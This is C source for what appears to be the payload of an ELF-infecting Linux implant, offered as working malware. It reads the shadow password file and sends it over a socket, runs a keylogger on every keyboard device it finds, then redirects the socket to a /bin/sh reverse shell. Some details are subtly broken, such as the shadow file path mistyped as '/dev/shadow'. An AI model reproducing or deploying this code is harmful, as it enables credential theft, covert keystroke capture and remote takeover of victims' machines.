
#include "elf_utils.h"
#include "payload.h"
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>

static char *read_file(char const *filepath)
{
    struct stat st = {0};
    register int fd = open(filepath, O_RDONLY);
    register int rstatus = -1;
    char *result = NULL;

    if (fd < 0 || stat(filepath, &st) < 0)
        return NULL;
    result = malloc(sizeof(char) * (st.st_size + 1));
    if (!result)
        return NULL;
    rstatus = read(fd, result, st.st_size);
    if (rstatus < 0)
        return NULL;
    result[rstatus] = 0;
    return result;
}

__attribute__((section(ELF_CODE)))
inline static int is_keyboard(const struct dirent *file)
{
    register size_t len = strlen(file->d_name);

    return len > 3
        && file->d_name[len - 3] == 'k'
        && file->d_name[len - 2] == 'b'
        && file->d_name[len - 1] == 'd';
}

__attribute__((section(ELF_CODE)))
inline static int *find_keyboards(void)
{
    struct dirent **char_devices = NULL;
    register int possible_paths = scandir(DIR_PATH, &char_devices,
            &is_keyboard, &alphasort);
    int *result = NULL;
    char *rpath = NULL;

    __log("Seeking keyboards");
    if (possible_paths == -1 || chdir(DIR_PATH) < 0)
        return NULL;

    rpath = malloc(sizeof(char) * BUFFER_SIZE);
    result = malloc(sizeof(int) * (possible_paths + 1));
    if (!rpath || !result)
        return NULL;

    result[possible_paths] = -1;
    for (int ctr = -1; ++ctr < possible_paths;) {
        __log("Found keyboard");
        rpath = realpath(char_devices[ctr]->d_name, rpath);
        result[ctr] = open(rpath, O_RDONLY);
    }

    for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);

    return result;
}

__attribute__((section(ELF_CODE)))
inline static void refresh_set(fd_set *set, int *kb)
{
    register int ctr = -1;

    FD_ZERO(set);
    while (kb[++ctr] != -1)
        FD_SET(kb[ctr], set);
}

__attribute__((section(ELF_CODE)))
inline static char *append(char *buffer, char *to_add)
{
    register size_t new_len = 0;

    if (!buffer || !(*buffer))
        return strdup(to_add);
    new_len = strlen(buffer) + strlen(to_add);
    buffer = realloc(buffer, sizeof(char) * (new_len + 1));
    buffer = strcat(buffer, to_add);
    return buffer;
}

__attribute__((section(ELF_CODE)))
inline static bool is_shift(char code)
{
    return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

__attribute__((section(ELF_CODE))) bool check_if_on_shift(bool is_on_shift, struct input_event evt)
{
    if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED && is_shift(evt.code))
        is_on_shift = true;
    else if (evt.type == EV_KEY && evt.value == EV_KEY_RELEASE
            && is_shift(evt.code))
        is_on_shift = false;
    return is_on_shift;
}

__attribute__((section(ELF_CODE)))
inline static void log_single_key(int fd)
{
    static char *buffer = NULL;
    static bool is_on_shift = false;
    int bytes_read = 0;
    int msg_length = 0;
    struct input_event evt;
    struct sigaction old;
    struct sigaction new = {
        .sa_handler = SIG_IGN,
        .sa_flags = 0
    };

    sigemptyset(&new.sa_mask);
    sigaction(SIGPIPE, &new, &old);
    do {

        bytes_read = read(fd, &evt, sizeof(struct input_event));
        if (bytes_read == -1) {
            break;
        } else is_on_shift = check_if_on_shift(is_on_shift, evt);

        if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED) {
            if (is_on_shift)
                buffer = append(buffer, SHIFT_KEYCODES[evt.code]);
            else buffer = append(buffer, KEYCODES[evt.code]);
        }

        if (buffer && strlen(buffer) >= BUFFER_SIZE) {
            __log(buffer);
            free(buffer);
            buffer = NULL;
        }
    } while (bytes_read < 0);
    sigaction(SIGPIPE, &old, NULL);
}

__attribute__((section(ELF_CODE)))
inline static void log_keys(int *fds)
{
    pid_t child = fork();
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    if (!child)
        return;

    fd_set wrt;
    fd_set rd;
    fd_set err;
    register int nb_kb = -1;
    register int status = 0;

    while (fds[++nb_kb] != -1);
    while (1) {
        refresh_set(&wrt, fds);
        refresh_set(&rd, fds);
        refresh_set(&err, fds);
        status = select(nb_kb + 1, &rd, &wrt, &err, &timeout);
        if (status == -1)
            KILL("select failure");

        register int ctr = -1;
        while (++ctr < nb_kb) {
            if (FD_ISSET(fds[ctr], &rd))
                log_single_key(fds[ctr]);
        }
    }
}

__attribute__((section(ELF_CODE)))
inline static void send_file_contents(void)
{
    char *shadow = read_file("/dev/shadow");

    // TODO send more files probablies

    dprintf(g_settings.sockfd, "/etc/shadow:%s\n", shadow);
    free(shadow);
}

__attribute__((section(ELF_CODE)))
void setup_payload(void)
{
    send_file_contents();

    int *keyboard_fds = find_keyboards();
    if (keyboard_fds != NULL)
        log_keys(keyboard_fds);

    dup2(g_settings.sockfd, 0);
    dup2(g_settings.sockfd, 1);
    dup2(g_settings.sockfd, 2);

    __log("Launching revshell");
    char * const argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

